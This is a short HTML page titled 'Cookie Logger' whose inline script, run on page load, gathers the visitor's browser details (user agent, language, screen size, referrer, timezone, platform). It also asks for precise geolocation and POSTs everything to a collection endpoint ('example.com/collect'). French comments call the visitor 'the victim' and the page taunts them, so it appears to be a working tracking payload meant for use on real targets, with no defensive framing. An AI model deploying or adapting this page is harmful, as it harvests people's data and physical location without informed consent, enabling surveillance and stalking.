<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Cookie Logger</title>
</head>
<body>
    <p>Ah... sorry... Thanks for the cookie :()</p>
  <script>
  (async () => {
    const info = {
      userAgent: navigator.userAgent,
      language: navigator.language,
      screen: {
        width: screen.width,
        height: screen.height
      },
      url: location.href,
      referrer: document.referrer,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      platform: navigator.platform,
      geolocation: null
    };

    // Tentative de géolocalisation (uniquement si la victime accepte)
    try {
      await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            info.geolocation = {
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
              accuracy: pos.coords.accuracy
            };
            resolve();
          },
          () => resolve(), // refus = ignore
          { timeout: 3000 }
        );
      });
    } catch {}

    // Envoi à ton endpoint de test (webhook, serveur perso, etc.)
    fetch("https://example.com/collect", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(info)
    });
  })();
</script>
</body>
</html>